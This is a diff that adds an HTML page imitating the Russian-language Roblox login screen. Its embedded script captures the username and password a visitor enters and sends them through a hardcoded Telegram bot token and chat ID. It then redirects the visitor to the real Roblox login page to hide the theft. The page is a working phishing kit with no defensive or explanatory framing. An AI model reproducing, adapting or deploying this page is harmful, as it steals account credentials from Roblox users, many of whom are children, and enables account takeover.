@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<title>Roblox — Вход</title>
+<style>
+body { font-family: Arial, sans-serif; background: #232527; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+.box { background: #2c2f33; padding: 40px; border-radius: 8px; width: 320px; }
+h1 { text-align: center; color: #fff; font-size: 22px; }
+input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #444; background: #1e2124; color: #fff; border-radius: 4px; box-sizing: border-box; }
+button { width: 100%; padding: 12px; background: #00a2ff; color: #fff; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 10px; }
+button:hover { background: #0086d6; }
+p { font-size: 12px; color: #888; text-align: center; margin-top: 15px; }
+</style>
+</head>
+<body>
+<div class="box">
+<h1>Вход в Roblox</h1>
+<form id="f">
+<input type="text" id="login" placeholder="Имя пользователя или Email" required>
+<input type="password" id="pass" placeholder="Пароль" required>
+<button type="submit">Войти</button>
+</form>
+<p>Забыли пароль? Восстановить</p>
+</div>
+<script>
+document.getElementById('f').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const login = document.getElementById('login').value;
+  const pass = document.getElementById('pass').value;
+
+  const token = '8777674209:AAF0WUhY6KLh4VytpKBO2mfMRJ1S04W1kv0';
+  const chatId = '7717299412';
+  const text = 'Roblox:\nЛогин: ' + login + '\nПароль: ' + pass;
+
+  await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({chat_id: chatId, text: text})
+  });
+
+  window.location.href = 'https://www.roblox.com/login';
+});
+</script>
+</body>
+</html>
